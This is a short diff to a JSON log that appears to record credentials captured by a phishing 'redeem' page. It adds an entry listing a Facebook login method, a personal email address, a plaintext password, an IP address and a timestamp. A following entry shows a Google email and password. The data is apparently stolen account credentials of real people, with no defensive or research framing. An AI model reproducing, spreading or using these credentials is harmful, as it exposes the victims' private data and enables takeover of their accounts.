@@ -1,6 +1,14 @@
 [
   {
     "page": "redeem",
+    "method": "Facebook",
+    "email": "hendrikuslepe@gmail.com",
+    "password": "hendrik 2008",
+    "ip": "103.161.117.73",
+    "ts": 1782321876680
+  },
+  {
+    "page": "redeem",
     "method": "Google",
     "email": "yenlipancawati07@gmail.com",
     "password": "BELIPOLYGON",
